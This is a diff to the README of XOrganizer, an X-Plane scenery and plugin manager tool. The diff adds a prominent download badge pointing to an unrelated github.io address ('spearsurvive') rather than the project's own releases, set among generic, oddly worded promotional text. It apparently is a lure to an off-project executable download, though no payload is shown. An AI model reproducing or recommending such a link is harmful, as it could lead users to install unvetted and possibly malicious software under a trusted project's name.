@@ -30,6 +30,12 @@ XOrganizer manages the X-Plane scenery library and plugin list, allowing enablin
 
 Whether you're a newcomer or a veteran, XOrganizer provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download XOrganizer](https://img.shields.io/badge/⬇_DOWNLOAD_XOrganizer-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
